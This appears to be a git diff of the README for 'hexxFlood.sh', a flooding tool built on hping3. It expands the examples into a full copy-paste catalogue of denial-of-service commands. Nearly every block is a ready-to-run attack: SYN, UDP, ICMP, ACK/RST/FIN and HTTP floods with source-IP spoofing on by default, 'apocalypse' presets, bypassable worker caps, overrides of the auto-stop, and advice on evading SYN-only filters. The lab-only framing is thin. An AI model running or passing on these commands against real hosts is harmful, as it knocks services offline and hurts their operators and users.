@@ -171,29 +171,221 @@ sized in multiples of `nproc` rather than spawning hundreds of thrashing process
 > - **Measure impact from a *third* device**, not the attacker — a `ping` on the attacking
 >   host reads high mostly because its own CPU is busy, not because the target is worse off.
 
-### Examples
+### Examples — every flag, what it does, and when to use it
+
+Below is a complete, copy-paste catalogue. Each block shows the flag **in a real
+command**, explains **what it does**, and tells you **when you'd reach for it**.
+
+#### 🎯 Choosing the target — `-t` / `-u`
 
 ```bash
-# SYN flood against a lab target for 60 seconds
-sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 60
+# -t, --target : attack a raw IP (Layer 3/4 flood via hping3). Use for any host,
+#                router, printer, IoT box — anything with an IP on your lab net.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m high
 
-# Multi-port flood — hits 80, 443 and 22 simultaneously
-sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -P 80,443,22 -p 100
+# -u, --url : attack a website by URL. Auto-resolves the domain to an IP, picks
+#             port 80 (http) / 443 (https), and runs the HTTP flood. Use when the
+#             target is a web app/server rather than a bare host.
+sudo ./hexxFlood.sh -u http://example.com -T http
 
-# No spoofing (real source IP) with a fixed destination port
-sudo ./hexxFlood.sh -t 192.168.1.14 -T syn --no-spoof --fixed-ports
+# URL with an explicit port (e.g. an app on :8080). Use when the site isn't on 80/443.
+sudo ./hexxFlood.sh -u http://example.com:8080 -T http -m high
+```
 
-# HTTP flood against a web app
+#### 🔥 Picking the intensity — `-m` (mode)
+
+```bash
+# -m easy : 2× cores, syn/udp/icmp, no tuning, runs forever. Use for a gentle
+#           smoke test / confirming the tool works without hammering anything.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m easy
+
+# -m medium : 4× cores, adds ack. A moderate load — use to see early impact.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m medium
+
+# -m high : 8× cores, ALL six TCP/UDP/ICMP types + system tuning. The everyday
+#           "really stress it" mode; runs until you stop it. Best default for demos.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m high
+
+# -m extreme : 16× cores, all types, tuning on, AUTO-STOPS after 60s. Use for a
+#              short, hard burst when you want maximum pressure but a safe auto-cutoff.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme
+
+# -m apocalypse : 32× cores, everything maxed, tuning on, auto-stops after 60s.
+#                 The heaviest preset — use only on wired lab gear you fully control.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m apocalypse
+
+# -m custom : ignore the presets and drive it yourself with -T / -P / -p / -s.
+#             Use when you want exact control over types, ports and packet size.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m custom -T syn,udp -P 80,53 -s 120
+```
+
+#### 🧨 Selecting attack types — `-T`
+
+```bash
+# -T syn : TCP SYN flood (half-open connections). Use against TCP services/ports
+#          to exhaust connection tables — the classic, most visual flood.
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn
+
+# -T udp : UDP flood. Use against UDP services (DNS :53, game servers, VoIP).
+sudo ./hexxFlood.sh -t 192.168.1.14 -T udp -P 53
+
+# -T icmp : ICMP (ping) flood. Use to saturate a host's ICMP handling / bandwidth.
+sudo ./hexxFlood.sh -t 192.168.1.14 -T icmp
+
+# -T ack,rst,fin : other TCP flag floods. Use to slip past filters that only watch
+#                  for SYN, or to stress a stateful firewall's connection tracking.
+sudo ./hexxFlood.sh -t 192.168.1.14 -T ack,rst,fin
+
+# -T all : every packet type at once (syn,udp,icmp,ack,rst,fin). Maximum variety —
+#          use when you don't care which vector lands, you just want everything.
+sudo ./hexxFlood.sh -t 192.168.1.14 -T all -m high
+
+# -T http : HTTP request flood (Layer 7). Use against web apps to exhaust worker
+#           threads/CPU rather than raw bandwidth. Pairs with -u and -p.
 sudo ./hexxFlood.sh -u http://192.168.1.14 -T http -p 100
+```
 
-# All attack types, extreme mode (auto-stops after 60s, tuning restored on exit)
-sudo ./hexxFlood.sh -t 192.168.1.14 -T all -m extreme
+#### 🔌 Ports & packet shape — `-P`, `-p`, `-s`, `-d`
 
-# Maximum overdrive — apocalypse (32× cores on wired; auto-capped on Wi-Fi), 60s
-sudo ./hexxFlood.sh -t 192.168.1.14 -m apocalypse -D 60
+```bash
+# -P, --ports : comma-separated destination ports — floods EACH one at once.
+#               Use to hit several services simultaneously (web + ssh + https).
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -P 80,443,22
 
-# Force an exact worker count and skip system tuning
-sudo HEXXFLOOD_WORKERS=16 ./hexxFlood.sh -t 192.168.1.14 -m extreme --no-tune
+# -p, --threads : worker/thread count (1-200). Mainly drives the HTTP flood's
+#                 concurrency; raise it to push a web app harder.
+sudo ./hexxFlood.sh -u http://192.168.1.14 -T http -p 150
+
+# -s, --size : packet size in bytes (64-65495). BIG size (default 65495) = max
+#              BANDWIDTH; SMALL size = max PACKETS/sec to overwhelm a host's CPU.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -s 120     # max pps
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -s 65495   # max bandwidth (default)
+
+# -d, --delay : inter-packet delay hint (u1/u10/u100 microseconds). Lower = faster.
+#               (Note: --flood mode already sends as fast as possible; use for
+#               deliberately throttled, quieter tests.)
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -d u100
+```
+
+#### ⏱️ Duration — `-D`
+
+```bash
+# -D SEC : run for N seconds then auto-stop. Use to bound a test / avoid babysitting.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m high -D 60
+
+# -D 0 : run forever (until Ctrl+C). Also OVERRIDES the 60s auto-stop of
+#        extreme/apocalypse — use when you explicitly want those modes to run open-ended.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -D 0
+```
+
+#### 🕵️ Source spoofing & port pattern — `--no-spoof`, `--fixed-ports`
+
+```bash
+# (default) spoofs a random source IP (--rand-source) and increments the dst port.
+
+# --no-spoof : send from your REAL source IP. Use when the target must see your
+#              real address (e.g. you're testing rate-limiting/geo-blocking on your
+#              own IP, or spoofing is dropped by the network).
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn --no-spoof
+
+# --fixed-ports : hammer a single static dst port instead of incrementing. Use to
+#                 concentrate all pressure on one service/port.
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -P 80 --fixed-ports
+
+# Both together — real IP, one fixed port (most "honest"/traceable configuration).
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn --no-spoof --fixed-ports
+```
+
+#### ⚙️ Performance tuning — `--tune`, `--no-tune`, `--tx-queue`
+
+```bash
+# --tune : force SAFE, restorable tuning ON (bigger NIC tx-queue + socket buffers +
+#          performance CPU governor). Use to squeeze out max throughput on modes
+#          where tuning is off by default (easy/medium/custom). Restored on exit.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m medium --tune
+
+# --no-tune : never touch system settings. Use on production-ish boxes or when you
+#             don't want the governor/buffers changed even for a heavy mode.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --no-tune
+
+# --tx-queue NUM : set the NIC tx queue length while flooding (default 10000). Raise
+#                  it if you see ENOBUFS/drops at very high packet rates on wired NICs.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m high --tx-queue 20000
+```
+
+#### 🧵 Worker-count overrides (env vars) — `HEXXFLOOD_WORKERS`, `WIFI_WORKER_CAP`
+
+```bash
+# HEXXFLOOD_WORKERS=N : force an EXACT, uncapped number of parallel flood workers.
+#                       Bypasses both the mode sizing and the Wi-Fi cap. Use on
+#                       wired NICs to push beyond the presets (auto modes cap at 1024).
+sudo HEXXFLOOD_WORKERS=600 ./hexxFlood.sh -t 192.168.1.14 -m extreme
+
+# WIFI_WORKER_CAP=N : change the Wi-Fi auto-cap (default 2× cores). On wireless,
+#                     MORE workers usually send LESS — tune this only if you've measured.
+sudo WIFI_WORKER_CAP=8 ./hexxFlood.sh -t 192.168.1.14 -m high -i wlan0
+```
+
+#### 🔐 Privileges — `sudo`, `AUTO_ROOT`
+
+```bash
+# Launch directly as root (no prompt) — the simplest full-power run.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m high
+
+# Not root? The tool asks "Run as root? [Y/n]". Skip that prompt with AUTO_ROOT:
+
+# AUTO_ROOT=yes : auto-elevate via sudo (one password prompt). Use in scripts/aliases.
+AUTO_ROOT=yes ./hexxFlood.sh -t 192.168.1.14 -m high
+
+# AUTO_ROOT=no : stay unprivileged — HTTP/URL flood only, no raw packets/tuning.
+#                Use when you deliberately only want the Layer-7 HTTP flood.
+AUTO_ROOT=no ./hexxFlood.sh -u http://example.com -T http -p 100
+```
+
+#### 🖥️ Interface & monitoring — `-i`, `--monitor`, `--auto-monitor`, `--no-monitor`
+
+```bash
+# -i, --interface : pick the NIC to flood from / read stats on (default wlan0).
+#                   Use eth0/enp3s0 for wired (far higher real throughput than Wi-Fi).
+sudo ./hexxFlood.sh -t 192.168.1.14 -m high -i eth0
+
+# --monitor : open the live monitor ONLY (no attack). Use to watch a target's health.
+hexxFlood --monitor -t 192.168.1.14
+
+# --monitor-mode : which monitor view for --monitor (ping|network|system|full|log).
+hexxFlood --monitor --monitor-mode ping -t 192.168.1.14
+
+# --auto-monitor MODES : attack AND auto-open monitor window(s), one per mode.
+#                        Use for a side-by-side attack+impact demo.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --auto-monitor full,ping,system
+
+# --no-monitor : attack only, no pop-up windows (stay in the current terminal).
+#                Use on headless/SSH boxes or when you just want the inline dashboard.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme --no-monitor
+```
+
+#### 🛠️ Utility — `-U`, `-V`, `-h`
+
+```bash
+hexxFlood -U    # --update  : fast-forward git pull to the latest version
+hexxFlood -V    # --version : print version and exit
+hexxFlood -h    # --help    : show the built-in usage guide
+```
+
+#### 🧩 Putting it together — common recipes
+
+```bash
+# Classic SYN-flood demo on a lab host, 2 minutes, with a monitor window.
+sudo ./hexxFlood.sh -t 192.168.1.14 -T syn -m high -D 120 --auto-monitor full
+
+# Max packets/sec CPU-crushing burst on wired NIC (small packets), 60s auto-stop.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m extreme -i eth0 -s 120
+
+# Layer-7 only, no root needed, hammer a web app with 150 HTTP workers.
+AUTO_ROOT=no ./hexxFlood.sh -u https://192.168.1.14 -T http -p 150
+
+# Fully manual: UDP+SYN on DNS+web ports, real source IP, fixed ports, 90s.
+sudo ./hexxFlood.sh -t 192.168.1.14 -m custom -T syn,udp -P 80,53 --no-spoof --fixed-ports -D 90
 ```
 
 ### Live attack output (in-terminal dashboard)
